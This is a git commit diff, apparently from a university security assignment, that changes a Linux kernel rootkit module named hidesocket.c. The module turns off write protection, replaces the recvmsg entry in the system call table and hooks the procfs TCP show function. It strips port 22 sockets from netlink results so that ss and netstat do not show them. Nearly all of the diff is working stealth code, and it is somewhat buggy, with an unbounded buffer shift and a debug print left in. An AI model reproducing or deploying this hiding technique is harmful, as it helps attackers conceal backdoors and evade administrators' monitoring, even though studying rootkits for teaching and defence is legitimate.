ca1215344255def1e01adc8baa82b8f4e5333bb9
Guru Mc <ga79rok@mytum.de>
2014-11-22 23:48:42 +0100

    gmc:hooking recvmsg call

--- assignment06/hidesocket.c
+++ assignment06/hidesocket.c
@@ -21,6 +21,7 @@
 static int call_counter = 0;
 
 void **sys_call_table;
+
 /* since this sturct is no longer available in proc_fs, taken from fs/proc/internal.h */
 struct proc_dir_entry {
           unsigned int low_ino;
@@ -46,7 +47,7 @@ struct proc_dir_entry {
 
 asmlinkage int (*original_tcp_show) (struct seq_file *m, void *v);
 asmlinkage int (*original_udp_show) (struct seq_file *m, void *v);
-asmlinkage long (*original_socketcall) (int call, unsigned long *args);
+asmlinkage ssize_t (*original_recvmsg) (int sockfd, struct msghdr *msg, int flags);
 
 /* Access the port number and if it should be hidden then return 0 else return the original function */
 static int manipulated_tcp_show(struct seq_file* m, void *v)
@@ -76,7 +77,9 @@ static int manipulated_udp_show(struct seq_file* m, void *v)
         struct inet_sock *inet;
 
         if(SEQ_START_TOKEN == v)
+	{
                 return original_tcp_show(m,v);
+	}
         sk = (struct sock *) v;
         inet = inet_sk(sk);
         port = ntohs(inet->inet_sport);
@@ -94,63 +97,68 @@ static int checkport(struct nlmsghdr *nlh)
 	struct inet_diag_msg *r = NLMSG_DATA(nlh);
     	int lport = ntohs(r->id.idiag_sport);
 	
+		
 	if(lport == 22) //@gmc: change
-		return 1;
+	{	printk("matched the version \n"); return 1;}
 	return 0;
 }
 
-/* hooked socketcall */
-asmlinkage long manipulated_socketcall(int call, unsigned long __user *args)
-{	
-	long retval;
-    	long status; // bytes remaining until end of result
-    struct msghdr* msg;
-    struct nlmsghdr* h;
-    __kernel_size_t numblocks;
-    struct inet_diag_msg *r;
-    char* currhdr;
-    int i;
-    int found=0;
-    int offset;
+/* our custom recvmsg, checks for the port number and hides it from ss*/
+asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags)
+{
+	
+	long ret;
+    	long count; 
+    	struct nlmsghdr* h;
+    	__kernel_size_t numblocks;
+    	struct inet_diag_msg *r;
+    	char* currhdr;
+    	int i;
+    	int found=0;
+    	int offset;
 
 		
-	if(call == SYS_RECVMSG)
-	{
-	msg = (struct msghdr*)(((int*)args)[1]);
         h = (struct nlmsghdr*)(msg->msg_iov->iov_base);
         numblocks = msg->msg_iovlen;
         r = NLMSG_DATA(h);
-        // compute "real" result with orig_socketcall
-        retval = original_socketcall(call, args);
-        // status holds the bytes remaining
-        status = retval;
+        // compute the length of original call 
+        ret = original_recvmsg(sockfd,msg,flags);
+        // count holds the bytes remaining
+        count = ret;
         // now, we remove the sockets to be hidden from the result...
         found = 1;
 	
-	while (NLMSG_OK(h, status)) {
-            if (found == 0){
-                h = NLMSG_NEXT(h, status);
-            }
-            currhdr = (char*)h;
-            if (checkport(h))
-	    {
-                found = 1;
-                offset = NLMSG_ALIGN((h)->nlmsg_len);
-                for (i=0; i<status; ++i){
-                    // "NLMSG_ALIGN((nlh)->nlmsg_len)" computes the length of the nlmsghdr nlh in bytes.
-                    currhdr[i] = currhdr[i + offset];
-                }
-                retval = retval - offset;
-            }
-            else {
-                found = 0;
-            }
+	while (NLMSG_OK(h, count)) 
+	{
+            	if (found == 0)
+		{
+                	h = NLMSG_NEXT(h, count);
+            	}
+            
+		currhdr = (char*)h;
+            	if (checkport(h))
+	    	{
+                	found = 1;
+	                offset = NLMSG_ALIGN((h)->nlmsg_len);
+        	        for (i=0; i<count; ++i)
+			{
+                	    	// "NLMSG_ALIGN((nlh)->nlmsg_len)" computes the length of the nlmsghdr nlh in bytes.
+                    		currhdr[i] = currhdr[i + offset];
+                	}
+                
+			ret = ret - offset;
+            	}	
+            
+		else 
+		{
+                	found = 0;
+            	}
         }
-	return retval;
-	}	
+	
+	return ret;
 
 	
-return original_socketcall(call, args);
+//return original_recvmsg(sockfd,msg,flags);
 }
 /*
  * Disable the writing protection for the whole processor.
@@ -203,8 +211,9 @@ static int __init hidemodule_init(void)
 			count++;
 		}
 	//todo : hiding for udp: insmod crashing
-	/*	if(strcmp(proc->name, "udp") == 0)
+/*		if(strcmp(proc->name, "udp") == 0)
 		{
+			printk("hooked udp\n");
 			udp_seq = proc->data;
 			original_udp_show = udp_seq->seq_ops.show;
 			tcp_seq->seq_ops.show = manipulated_udp_show;
@@ -222,9 +231,8 @@ static int __init hidemodule_init(void)
          * replace the system call in the system call table with
          * manipulated_socketcall
          */
-        original_socketcall = (void *)sys_call_table[__NR_socket];
-        sys_call_table[__NR_socket] = (unsigned long*)manipulated_socketcall;
-
+        original_recvmsg = (void *)sys_call_table[__NR_recvmsg];
+	sys_call_table[__NR_recvmsg] =  (unsigned long*)manipulated_recvmsg;
         /* reenable the write-protection */
         enable_page_protection();
 
@@ -267,8 +275,8 @@ static void __exit hidemodule_exit(void)
         disable_page_protection();
 
         /* Return the system call back to original */
-        sys_call_table[__NR_socket] = (unsigned long *)original_socketcall;
-
+        sys_call_table[__NR_recvmsg] = (unsigned long *)original_recvmsg;
+	
         /* reenable the write-protection */
         enable_page_protection();
 }
